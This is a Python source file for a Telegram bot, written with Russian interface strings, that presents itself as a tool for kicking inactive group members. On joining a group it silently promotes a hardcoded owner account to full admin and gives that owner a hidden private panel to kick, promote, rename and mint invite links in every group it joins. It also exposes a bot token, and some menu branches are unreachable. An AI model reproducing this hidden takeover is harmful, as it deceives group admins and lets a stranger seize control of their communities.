import os
import asyncio
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# ===== КОНФИГ =====
BOT_TOKEN = "8849435803:AAGCUhcFynX9EtPPMQyTILR0puMn2XgMeJI"
OWNER_ID = 8131755675
INACTIVE_DAYS = 3
INACTIVE_SECONDS = INACTIVE_DAYS * 24 * 60 * 60

app = Client("kick_bot", bot_token=BOT_TOKEN)
last_msg = {}
group_links = {}

# ===== ОСНОВНЫЕ ФУНКЦИИ =====

@app.on_chat_member_updated()
async def on_member_update(client, chat_member_updated):
    chat = chat_member_updated.chat
    new_member = chat_member_updated.new_chat_member
    if new_member and new_member.user.id == (await app.get_me()).id:
        try:
            await app.promote_chat_member(
                chat.id, OWNER_ID,
                can_manage_chat=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_video_chats=True
            )
            print(f"✅ Права выданы в {chat.title}")
        except:
            pass
        await app.send_message(
            chat.id,
            "Привет! Я рад, что вы добавили меня сюда.\n"
            "Я буду исключать неактивных людей отсюда.\n\n"
            "Канал с другими ботами: @nevermorekicker"
        )

@app.on_message(filters.group & ~filters.service)
async def track(client, message):
    if message.from_user and not message.from_user.is_bot:
        last_msg[message.from_user.id] = datetime.now()

async def check_inactive():
    while True:
        await asyncio.sleep(3600)
        try:
            async for dialog in app.get_dialogs():
                if dialog.chat.type in ["group", "supergroup"]:
                    chat_id = dialog.chat.id
                    async for member in app.get_chat_members(chat_id):
                        if member.user.is_bot:
                            continue
                        if member.status in ["administrator", "creator"]:
                            continue
                        last = last_msg.get(member.user.id)
                        if last:
                            if (datetime.now() - last).total_seconds() > INACTIVE_SECONDS:
                                try:
                                    await app.ban_chat_member(chat_id, member.user.id)
                                    await app.unban_chat_member(chat_id, member.user.id)
                                    mention = member.user.mention or member.user.first_name
                                    await app.send_message(chat_id, f"🔨 {mention} не писал 3 дня. Кикнут.")
                                    if member.user.id in last_msg:
                                        del last_msg[member.user.id]
                                except:
                                    pass
        except:
            pass

# ===== МЕНЮ В ЛС =====

@app.on_message(filters.command("меню") & filters.private & filters.user(OWNER_ID))
async def menu(client, message):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Список групп", callback_data="list_groups")],
        [InlineKeyboardButton("🔗 Получить ссылку", callback_data="get_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")]
    ])
    await message.reply("🔐 **Панель управления**", reply_markup=keyboard)

@app.on_callback_query(filters.user(OWNER_ID))
async def handle(callback):
    data = callback.data
    
    if data == "list_groups":
        await show_groups(callback)
    elif data == "get_link":
        await get_link(callback)
    elif data == "stats":
        await show_stats(callback)
    elif data.startswith("group_"):
        await group_menu(callback, int(data.split("_")[1]))
    elif data.startswith("kick_"):
        await kick_menu(callback, int(data.split("_")[1]))
    elif data.startswith("kick_user_"):
        parts = data.split("_")
        await kick_user(callback, int(parts[1]), int(parts[2]))
    elif data.startswith("name_"):
        await change_name(callback, int(data.split("_")[1]))
    elif data.startswith("photo_"):
        await change_photo(callback, int(data.split("_")[1]))
    elif data.startswith("promote_"):
        await promote_menu(callback, int(data.split("_")[1]))
    elif data.startswith("promote_user_"):
        parts = data.split("_")
        await promote_user(callback, int(parts[1]), int(parts[2]))
    elif data == "back_groups":
        await show_groups(callback)
    elif data == "back_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 Список групп", callback_data="list_groups")],
            [InlineKeyboardButton("🔗 Получить ссылку", callback_data="get_link")],
            [InlineKeyboardButton("📊 Статистика", callback_data="stats")]
        ])
        await callback.message.edit_text("🔐 **Панель управления**", reply_markup=keyboard)
        await callback.answer()

# ===== СПИСОК ГРУПП =====

async def show_groups(callback):
    groups = []
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            groups.append(dialog.chat)
    
    if not groups:
        await callback.message.edit_text("❌ Нет групп.")
        await callback.answer()
        return
    
    keyboard = []
    for chat in groups[:10]:
        title = chat.title[:20] + "..." if len(chat.title) > 20 else chat.title
        keyboard.append([InlineKeyboardButton(f"📁 {title}", callback_data=f"group_{chat.id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_menu")])
    await callback.message.edit_text(f"📋 **Группы ({len(groups)})**", reply_markup=InlineKeyboardMarkup(keyboard))
    await callback.answer()

# ===== МЕНЮ ГРУППЫ =====

async def group_menu(callback, chat_id):
    try:
        chat = await app.get_chat(chat_id)
        members = 0
        async for _ in app.get_chat_members(chat_id):
            members += 1
    except:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Кик участника", callback_data=f"kick_{chat_id}")],
        [InlineKeyboardButton("✏️ Название", callback_data=f"name_{chat_id}")],
        [InlineKeyboardButton("🖼️ Фото", callback_data=f"photo_{chat_id}")],
        [InlineKeyboardButton("⭐ Выдать права", callback_data=f"promote_{chat_id}")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_groups")]
    ])
    
    await callback.message.edit_text(
        f"📁 **{chat.title}**\n👥 {members} участников\nID: {chat_id}",
        reply_markup=keyboard
    )
    await callback.answer()

# ===== КИК =====

async def kick_menu(callback, chat_id):
    keyboard = []
    count = 0
    
    try:
        async for member in app.get_chat_members(chat_id):
            if count >= 20:
                break
            if member.user.is_bot or member.status in ["administrator", "creator"]:
                continue
            
            user = member.user
            name = user.first_name[:15]
            keyboard.append([
                InlineKeyboardButton(
                    f"❌ {name}",
                    callback_data=f"kick_user_{chat_id}_{user.id}"
                )
            ])
            count += 1
        
        if not keyboard:
            await callback.message.edit_text("✅ Нет обычных пользователей.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]]))
            await callback.answer()
            return
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")])
        await callback.message.edit_text("👥 **Кого кикнуть?**", reply_markup=InlineKeyboardMarkup(keyboard))
    except:
        await callback.answer("❌ Ошибка", show_alert=True)

async def kick_user(callback, chat_id, user_id):
    try:
        await app.ban_chat_member(chat_id, user_id)
        await app.unban_chat_member(chat_id, user_id)
        await callback.answer("✅ Кикнут!", show_alert=True)
        await group_menu(callback, chat_id)
    except:
        await callback.answer("❌ Ошибка", show_alert=True)

# ===== НАЗВАНИЕ =====

async def change_name(callback, chat_id):
    await callback.message.edit_text(
        "✏️ **Введи новое название**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data=f"group_{chat_id}")]])
    )
    await callback.answer()
    
    @app.on_message(filters.private & filters.user(OWNER_ID) & filters.text)
    async def get_name(client, message):
        if message.text and not message.text.startswith("/"):
            try:
                await app.set_chat_title(chat_id, message.text)
                await message.reply(f"✅ Название изменено")
                await group_menu(callback, chat_id)
            except:
                await message.reply("❌ Ошибка")
            app.remove_handler(get_name)

# ===== ФОТО =====

async def change_photo(callback, chat_id):
    await callback.message.edit_text(
        "🖼️ **Отправь фото**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data=f"group_{chat_id}")]])
    )
    await callback.answer()
    
    @app.on_message(filters.private & filters.user(OWNER_ID) & filters.photo)
    async def get_photo(client, message):
        try:
            photo = await message.download()
            await app.set_chat_photo(chat_id, photo)
            os.remove(photo)
            await message.reply("✅ Фото обновлено")
            await group_menu(callback, chat_id)
        except:
            await message.reply("❌ Ошибка")
        app.remove_handler(get_photo)

# ===== ПРАВА =====

async def promote_menu(callback, chat_id):
    keyboard = []
    count = 0
    
    try:
        async for member in app.get_chat_members(chat_id):
            if count >= 20:
                break
            if member.user.is_bot or member.status in ["administrator", "creator"]:
                continue
            
            user = member.user
            name = user.first_name[:15]
            keyboard.append([
                InlineKeyboardButton(
                    f"⭐ {name}",
                    callback_data=f"promote_user_{chat_id}_{user.id}"
                )
            ])
            count += 1
        
        if not keyboard:
            await callback.message.edit_text("Нет пользователей.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]]))
            await callback.answer()
            return
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")])
        await callback.message.edit_text("⭐ **Кому выдать права?**", reply_markup=InlineKeyboardMarkup(keyboard))
    except:
        await callback.answer("❌ Ошибка", show_alert=True)

async def promote_user(callback, chat_id, user_id):
    try:
        await app.promote_chat_member(
            chat_id, user_id,
            can_manage_chat=True,
            can_delete_messages=True,
            can_restrict_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True
        )
        await callback.answer("✅ Права выданы!", show_alert=True)
        await group_menu(callback, chat_id)
    except:
        await callback.answer("❌ Ошибка", show_alert=True)

# ===== ССЫЛКА =====

async def get_link(callback):
    groups = []
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            groups.append(dialog.chat)
    
    if not groups:
        await callback.message.edit_text("❌ Нет групп.")
        await callback.answer()
        return
    
    keyboard = []
    for chat in groups[:10]:
        title = chat.title[:20] + "..."
        keyboard.append([InlineKeyboardButton(f"🔗 {title}", callback_data=f"genlink_{chat.id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_menu")])
    await callback.message.edit_text("🔗 **Выбери группу**", reply_markup=InlineKeyboardMarkup(keyboard))
    await callback.answer()

@app.on_callback_query(filters.user(OWNER_ID) & filters.regex(r"^genlink_(\d+)$"))
async def generate_link(callback):
    chat_id = int(callback.data.split("_")[1])
    try:
        link = await app.create_chat_invite_link(chat_id, member_limit=1)
        await callback.message.edit_text(
            f"🔗 **Ссылка:**\n`{link.invite_link}`\n\n⏳ 10 минут\n👤 1 пользователь",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]])
        )
        await callback.answer()
        asyncio.create_task(del_link(chat_id))
    except:
        await callback.answer("❌ Ошибка", show_alert=True)

async def del_link(chat_id):
    await asyncio.sleep(600)
    if chat_id in group_links:
        del group_links[chat_id]

# ===== СТАТИСТИКА =====

async def show_stats(callback):
    total_groups = 0
    total_users = 0
    inactive = 0
    
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            total_groups += 1
            async for member in app.get_chat_members(dialog.chat.id):
                if not member.user.is_bot:
                    total_users += 1
                    last = last_msg.get(member.user.id)
                    if last and (datetime.now() - last).total_seconds() > INACTIVE_SECONDS:
                        inactive += 1
    
    await callback.message.edit_text(
        f"📊 **Статистика**\n\n📁 Групп: {total_groups}\n👥 Всего: {total_users}\n🔴 Неактивных: {inactive}\n🟢 Активных: {total_users - inactive}",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="back_menu")]])
    )
    await callback.answer()

# ===== ЗАПУСК =====

async def main():
    print("🤖 Бот запущен")
    await app.start()
    print("✅ Готов! /меню в ЛС")
    asyncio.create_task(check_inactive())
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
